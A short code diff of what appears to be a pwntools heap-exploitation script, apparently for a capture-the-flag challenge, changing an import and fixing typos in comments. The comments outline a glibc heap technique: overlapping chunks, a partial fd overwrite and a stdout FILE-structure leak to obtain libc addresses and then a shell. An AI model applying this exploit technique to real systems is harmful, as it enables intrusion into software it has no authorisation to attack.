@@ -1,5 +1,5 @@
 #coding:utf-8
-from pwn import *
+import pwn
 import json
 import shutil
 
@@ -168,9 +168,9 @@ fake_fd = p64(std_out_base + offsets['file']['_IO_write_ptr'])[:2]
 
 # first construct overlap chunk, to get main_arena's address as fd
 
-# the overwrite low two bytes of the fd to fake_fd
+# then overwrite low two bytes of the fd to fake_fd
 
-# the malloc a chunk at stdout->file._IO_write_ptr. and enlarge the low byte 
+# then malloc a chunk at stdout->file._IO_write_ptr. and enlarge the low byte 
 # then you can get libc address
 
 # then get shell
